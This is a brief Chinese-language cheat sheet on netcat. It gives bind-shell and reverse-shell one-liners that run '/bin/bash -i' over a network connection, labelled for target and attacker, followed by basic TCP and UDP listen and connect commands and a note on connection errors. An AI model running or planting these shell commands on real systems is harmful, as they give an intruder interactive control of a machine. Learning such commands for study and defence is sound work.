Bind Shell

目標

nc -l -p 1234 -e "/bin/bash -i"

攻擊者

nc 127.0.0.1 1234

Reverse Shell

目標

nc 127.0.0.1 4321 -e "/bin/bash -i"

攻擊者

nc -l -p 4321

TCP

監聽

nc -l -p 1234

連線

nc localhost 1234

UDP

監聽

nc -u -l -p 1234

連線

nc -u localhost 1234

基本概念

若透過nc的TCP模式連上未開啟tcp伺服器則會無法連線， 透過udp連上未開啟的udp伺服器在送出的時候才會報錯，。
